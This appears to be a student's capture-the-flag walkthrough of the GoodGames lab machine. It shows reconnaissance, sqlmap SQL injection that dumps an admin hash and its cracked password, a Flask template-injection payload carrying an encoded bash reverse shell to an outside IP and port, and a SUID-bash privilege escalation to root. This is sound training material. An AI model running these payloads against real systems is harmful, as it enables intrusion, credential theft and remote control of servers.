nmap -sV -sC 10.129.48.140 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:17 CST
Nmap scan report for 10.129.48.140
Host is up (0.010s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

​
This tells me its gonna be some web exploitation nonsesne 
feroxbuster -u http://10.129.48.140
                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.48.140
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      267l      548w     9265c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        4l       24w      208c http://10.129.48.140/logout => http://10.129.48.140/
200      GET       11l       46w    51284c http://10.129.48.140/static/vendor/ionicons/css/ionicons.min.css
200      GET        7l       39w     3176c http://10.129.48.140/static/images/team-3.jpg
200      GET      141l      494w     6179c http://10.129.48.140/static/js/goodgames-init.js
200      GET       15l       49w     3328c http://10.129.48.140/static/images/team-4.jpg
200      GET        2l     1283w    86927c http://10.129.48.140/static/vendor/jquery/dist/jquery.min.js
200      GET       98l      529w    58137c http://10.129.48.140/static/images/post-2-sm.jpg
200      GET       17l      125w    14953c http://10.129.48.140/static/images/avatar-3.jpg
200      GET       22l      253w     5339c http://10.129.48.140/static/vendor/jquery-countdown/dist/jquery.countdown.min.js
200      GET       16l       83w     6886c http://10.129.48.140/static/images/slide-5-thumb.jpg
200      GET      317l     1775w   138255c http://10.129.48.140/static/images/post-3-mid-square.jpg
200      GET      274l     1540w   135078c http://10.129.48.140/static/images/post-4-mid-square.jpg
200      GET       22l       88w     6942c http://10.129.48.140/static/images/slide-3-thumb.jpg
200      GET        2l       47w     3285c http://10.129.48.140/static/vendor/object-fit-images/dist/ofi.min.js
200      GET      482l     1238w    11607c http://10.129.48.140/static/vendor/photoswipe/dist/default-skin/default-skin.css
200      GET        6l       32w     2624c http://10.129.48.140/static/images/favicon.png
200      GET      255l     1415w   132247c http://10.129.48.140/static/images/gallery-3-thumb.jpg
200      GET      661l     4055w   365881c http://10.129.48.140/static/images/post-2-fw.jpg
200      GET       67l      410w    46555c http://10.129.48.140/static/images/post-6-sm.jpg
200      GET      730l     2069w    32744c http://10.129.48.140/forgot-password
200      GET      381l     3180w   322207c http://10.129.48.140/static/images/post-3-mid.jpg
200      GET      248l     1594w   146007c http://10.129.48.140/static/images/post-2-mid.jpg
200      GET     1396l     8153w   626132c http://10.129.48.140/static/images/slide-4.jpg
200      GET       13l      670w    55241c http://10.129.48.140/static/vendor/flickity/dist/flickity.pkgd.min.js
200      GET      976l     2368w    26329c http://10.129.48.140/static/vendor/nanoscroller/bin/javascripts/jquery.nanoscroller.js
200      GET        5l       14w     1633c http://10.129.48.140/static/images/icon-mouse.png
200      GET      426l     2868w   278138c http://10.129.48.140/static/images/post-1-mid.jpg
200      GET      286l     1213w    92513c http://10.129.48.140/static/images/gallery-2-thumb.jpg
200      GET       23l      103w     8887c http://10.129.48.140/static/images/slide-4-thumb.jpg
200      GET      179l      495w     4137c http://10.129.48.140/static/vendor/photoswipe/dist/photoswipe.css
200      GET      284l     1961w   148751c http://10.129.48.140/static/images/post-5.jpg
200      GET      291l     1655w   166853c http://10.129.48.140/static/images/post-7-fw.jpg
200      GET       31l      138w    11058c http://10.129.48.140/static/images/slide-2-thumb.jpg
200      GET       77l       68w     4450c http://10.129.48.140/static/images/team-2.jpg
200      GET      752l     4077w   374382c http://10.129.48.140/static/images/bg-bottom.png
200      GET      455l     3107w   328015c http://10.129.48.140/static/images/post-6-mid.jpg
200      GET        1l        9w       43c http://10.129.48.140/static/css/custom.css
200      GET     1380l     8354w   799466c http://10.129.48.140/static/images/bg-top-3.png
200      GET      909l     2572w    44212c http://10.129.48.140/blog
200      GET      644l     4141w   396387c http://10.129.48.140/static/images/post-7-mid-square.jpg
200      GET     2197l     9609w   891651c http://10.129.48.140/static/images/bg-top.png
200      GET        4l       20w     1821c http://10.129.48.140/static/vendor/flickity/dist/flickity.min.css
200      GET       89l      882w    74924c http://10.129.48.140/static/images/post-5-sm.jpg
200      GET        7l      110w     5594c http://10.129.48.140/static/vendor/imagesloaded/imagesloaded.pkgd.min.js
200      GET       40l      331w    36945c http://10.129.48.140/static/images/post-3-sm.jpg
200      GET        6l       19w     1948c http://10.129.48.140/static/images/icon-gamepad-2.png
200      GET       70l      477w    48703c http://10.129.48.140/static/images/post-4-sm.jpg
200      GET       32l      153w    13850c http://10.129.48.140/static/images/slide-1-thumb.jpg
200      GET      450l     2771w   277160c http://10.129.48.140/static/images/post-7-mid.jpg
200      GET        5l       43w    15185c http://10.129.48.140/static/vendor/fontawesome-free/js/v4-shims.js
200      GET      151l      524w    42334c http://10.129.48.140/static/images/product-14-xs.jpg
200      GET        7l      324w    20765c http://10.129.48.140/static/vendor/hammerjs/hammer.min.js
200      GET      131l      368w    29221c http://10.129.48.140/static/images/product-2-xs.jpg
200      GET      728l     2070w    33387c http://10.129.48.140/signup
200      GET       87l      621w    68972c http://10.129.48.140/static/images/product-13-xs.jpg
200      GET      165l      426w     6235c http://10.129.48.140/static/plugins/nk-share/nk-share.js
200      GET      311l     2258w   210957c http://10.129.48.140/static/images/gallery-1.jpg
200      GET      205l     1308w   142074c http://10.129.48.140/static/images/gallery-6-thumb.jpg
200      GET      180l     1181w   127004c http://10.129.48.140/static/images/gallery-1-thumb.jpg
200      GET      164l     1059w    83980c http://10.129.48.140/static/images/post-5-mid-square.jpg
200      GET       10l       39w     3278c http://10.129.48.140/static/vendor/sticky-kit/dist/sticky-kit.min.js
200      GET       11l      865w    51627c http://10.129.48.140/static/js/goodgames.min.js
200      GET      115l      621w    64768c http://10.129.48.140/static/images/product-11-xs.jpg
200      GET      472l     2603w   190866c http://10.129.48.140/static/images/slide-5.jpg
200      GET        5l      363w    20337c http://10.129.48.140/static/vendor/popper.js/dist/umd/popper.min.js
200      GET      157l      601w    40457c http://10.129.48.140/static/images/product-3-xs.jpg
200      GET      235l     1287w   118995c http://10.129.48.140/static/images/slide-2.jpg
200      GET      374l     2147w   173605c http://10.129.48.140/static/images/gallery-3.jpg
200      GET        4l       18w     1540c http://10.129.48.140/static/images/logo.png
200      GET       12l       80w     3454c http://10.129.48.140/static/vendor/gsap/src/minified/plugins/ScrollToPlugin.min.js
200      GET      818l     4319w   341105c http://10.129.48.140/static/images/gallery-2.jpg
200      GET     1566l     7938w   565045c http://10.129.48.140/static/images/post-2.jpg
200      GET       17l     1147w   114925c http://10.129.48.140/static/vendor/gsap/src/minified/TweenMax.min.js
200      GET     1219l     7066w   567084c http://10.129.48.140/static/images/post-3-fw.jpg
200      GET      190l     1218w   115133c http://10.129.48.140/static/images/post-1.jpg
200      GET        4l      401w    23261c http://10.129.48.140/static/vendor/jquery-validation/dist/jquery.validate.min.js
200      GET      816l     4680w   394491c http://10.129.48.140/static/images/slide-1.jpg
200      GET        4l      287w    31903c http://10.129.48.140/static/vendor/photoswipe/dist/photoswipe.min.js
200      GET      226l     1258w    94472c http://10.129.48.140/static/images/gallery-4.jpg
200      GET        7l      258w    14848c http://10.129.48.140/static/vendor/jarallax/dist/jarallax.min.js
200      GET        7l       21w     2197c http://10.129.48.140/static/images/icon-gamepad.png
200      GET      818l     3942w   297350c http://10.129.48.140/static/images/post-4.jpg
200      GET      212l     1403w   153841c http://10.129.48.140/static/images/gallery-4-thumb.jpg
200      GET      789l     4594w   382202c http://10.129.48.140/static/images/post-6.jpg
200      GET      129l      442w    36851c http://10.129.48.140/static/images/product-1-xs.jpg
200      GET      103l      665w    74822c http://10.129.48.140/static/images/product-12-xs.jpg
200      GET     1071l     6286w   469468c http://10.129.48.140/static/images/post-5-fw.jpg
200      GET      182l     1473w   189609c http://10.129.48.140/static/images/gallery-5-thumb.jpg
200      GET       41l      397w     9248c http://10.129.48.140/static/vendor/bootstrap-slider/dist/css/bootstrap-slider.min.css
200      GET      370l     2341w   209844c http://10.129.48.140/static/images/post-3.jpg
200      GET       90l      449w    44725c http://10.129.48.140/static/images/post-1-sm.jpg
200      GET      663l     1856w    31374c http://10.129.48.140/blog/1
200      GET      765l     4456w   340971c http://10.129.48.140/static/images/gallery-6.jpg
200      GET        4l       76w     9878c http://10.129.48.140/static/vendor/photoswipe/dist/photoswipe-ui-default.min.js
200      GET        7l      572w    50731c http://10.129.48.140/static/vendor/bootstrap/dist/js/bootstrap.min.js
200      GET      629l     3599w   294977c http://10.129.48.140/static/images/post-1-fw.jpg
200      GET      205l     1195w   104589c http://10.129.48.140/static/images/gallery-5.jpg
200      GET      365l     2207w   176996c http://10.129.48.140/static/images/slide-3.jpg
200      GET        1l      935w    51638c http://10.129.48.140/static/vendor/moment/min/moment.min.js
200      GET      466l     3396w   331436c http://10.129.48.140/static/images/post-5-mid.jpg
200      GET        1l    27694w   184339c http://10.129.48.140/static/vendor/moment-timezone/builds/moment-timezone-with-data.min.js
200      GET     9754l    19468w   205778c http://10.129.48.140/static/css/goodgames.css
200      GET        5l    60950w   672646c http://10.129.48.140/static/vendor/fontawesome-free/js/all.js
200      GET      362l     2687w   254224c http://10.129.48.140/static/images/post-9-mid-square.jpg
200      GET     1735l     5548w    85107c http://10.129.48.140/
403      GET        9l       28w      278c http://10.129.48.140/server-status

​
Bunch of bullshit in feroxbuster
So we go to the page and find a login screen 
Checking burp its vulnerable to SQL injection it seems.
Anyway were in and get a cookie 
GET /profile HTTP/1.1
Host: 10.129.48.140
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.48.140/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJw1yz0KgDAMBtC7fHMRXDN5E4kkjYX-QNNO4t3t4v7egzN29RsUObsGaOGUQWApqR7WmhgX9e0eFwKSgPaA3MxUUgWNPlearr0u9j-8Hz1GHgw.Z5vkug.MmU1PVGYo-zMzuRsla9fezwsz8c
Connection: close
​
So now we have access lets use sqlmap to scan the db learned a lot 
So you have to set the http request in a file so in this example “goodgames.req”
POST /login HTTP/1.1
Host: 10.129.48.140
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.129.48.140
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.48.140/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

email=admin@goodgame.htb&password=password
​
Notice we took the sql injection test out and instead of the basic  “admin” in email we actually enter the email,
After
sqlmap -r goodgames.req

​
sqlmap -r goodgames.req
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.12#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:00:30 /2025-01-30/

[15:00:30] [INFO] parsing HTTP request from 'goodgames.req'
[15:00:30] [INFO] testing connection to the target URL
[15:00:30] [INFO] testing if the target URL content is stable
[15:00:31] [INFO] target URL content is stable
[15:00:31] [INFO] testing if POST parameter 'email' is dynamic
[15:00:31] [WARNING] POST parameter 'email' does not appear to be dynamic
[15:00:31] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
[15:00:31] [INFO] testing for SQL injection on POST parameter 'email'
[15:00:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:00:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:00:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:00:32] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[15:00:32] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[15:00:32] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[15:00:32] [INFO] testing 'Generic inline queries'
[15:00:32] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[15:00:32] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[15:00:33] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[15:00:33] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:00:43] [INFO] POST parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes?
​
We see through this that it is injectable! Confirming our manual testing of course…
We also find the backend DB is MySql, now lets go further and use ..
sqlmap -r goodgames.req --dbs
​
We see the following output -
15:06:26] [INFO] parsing HTTP request from 'goodgames.req'
[15:06:26] [INFO] resuming back-end DBMS 'mysql' 
[15:06:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=admin@goodgames.htb' AND (SELECT 1816 FROM (SELECT(SLEEP(5)))aFNv) AND 'MYhe'='MYhe&password=password
---
[15:06:26] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[15:06:26] [INFO] fetching database names
[15:06:26] [INFO] fetching number of databases
[15:06:26] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)             
[15:06:27] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
2
[15:06:43] [INFO] retrieved: 
[15:06:48] [INFO] adjusting time delay to 1 second due to good response times
information_schema
[15:07:47] [INFO] retrieved: main
available databases [2]:
[*] information_schema
[*] main


​
Key information here is the available db’s “main and information_schema” Naturally we look toward main to see what we can get into here 😀​
sqlmap -r goodgames.req -D main --tables
​
This command essentially enumerates table names within db’s so we can then go further and we get a juicy output 
fetching tables for database: 'main'
[15:11:27] [INFO] fetching number of tables for database 'main'
[15:11:27] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)             
[15:11:28] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[15:11:46] [INFO] adjusting time delay to 1 second due to good response times
3
[15:11:46] [INFO] retrieved: blog
[15:12:00] [INFO] retrieved: blog_comments
[15:12:38] [INFO] retrieved: user
Database: main
[3 tables]
+---------------+
| user          |
| blog          |
| blog_comments |
+---------------+

​
We see 3 tables within “main” user looks juicy…
So after enumerates and enumerating we now have the exact table to dump so… lets dump
sqlmap -r goodgames.req -D main -T user --dump
​
So even though it is very slow 
retrieved: 
[15:14:42] [INFO] adjusting time delay to 1 second due to good response times
email
[15:14:54] [INFO] retrieved: id
[15:15:00] [INFO] retrieved: name
[15:15:12] [INFO] retrieved: password
[15:15:40] [INFO] fetching entries for table 'user' in database 'main'
[15:15:40] [INFO] fetching number of entries for table 'user' in database 'main'
[15:15:40] [INFO] retrieved: 3
[15:15:43] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)    
admin
[15:15:59] [INFO] retrieved: admin@goodgames.htb
[15:17:01] [INFO] retrieved: 1
[15:17:03] [INFO] retrieved: 2b22337f218b2d82dfc3b6f77e7cb8ec

​
So we have our username and a hash 
admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec
Found it was an MD5 hash so easy lets try the rainbow tables 
superadministrator looool
After using the cred to login we tried to press the settings but see a new url 
Looks like an admin panel so lets add it to /etc/hosts
Lead to a flask login page so reused those creds and
admin & superadmin
So i consulted the walkthrough for this one and….
 
“SSTI
Navigating to the settings page we notice that we can edit our user details. As this is a Python
Flask application this would be a good time to test the form for Server Side Template Injection.
After changing our username to {{7*7}} we see that our username has been changed to 49
and our SSTI payload was executed.”
This is an attack ive never heard of but sure enough it worked as it exectuted the 7x7 command and outputted 49, cool
{{config.class.init.globals['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDMvNDQ0NCAwPiYx+JjE=${IFS}|base64${IFS}-d|bash').read()}}
This command suggested by the guide didnt work so with some ai help we got 
{{ config.__class__.__init__.__globals__['os'].popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDMvNDQ0NCAwPiYx | base64 -d | bash').read() }}

​
essentially removing {IFS} this simplified it and was maybe down to a parsing issue as we got “ambigious redirect”
so we can also ssh into augustus through port 22 after an internal port scan
by running 
script /dev/null bash

ssh augustus@IP$
​
I’ll copy /bin/bash
 into augustus’ home directory on the host. It’s important to use bash
 from the host (I’ll cover why in Beyond Root).
augustus@GoodGames:~$ cp /bin/bash .
​
Then in the container, I’ll change the owner to root, and set the permissions to be SUID:
root@3a453ab39d3d:/home/augustus# ls -l bash 
-rwxr-xr-x 1 1000 1000 1234376 Feb 22 15:25 bash
root@3a453ab39d3d:/home/augustus# chown root:root bash 
root@3a453ab39d3d:/home/augustus# chmod 4777 bash 
root@3a453ab39d3d:/home/augustus# ls -l bash
-rwsrwxrwx 1 root root 1234376 Feb 22 15:25 bash
​
Back on GoodGames, the changes are reflected:
augustus@GoodGames:~$ ls -l bash 
-rwsrwxrwx 1 root root 1234376 Feb 22 15:25 bash
​
Running it (with -p
 so that privileges aren’t dropped) returns a root shell:
augustus@GoodGames:~$ ./bash -p
bash-5.1#
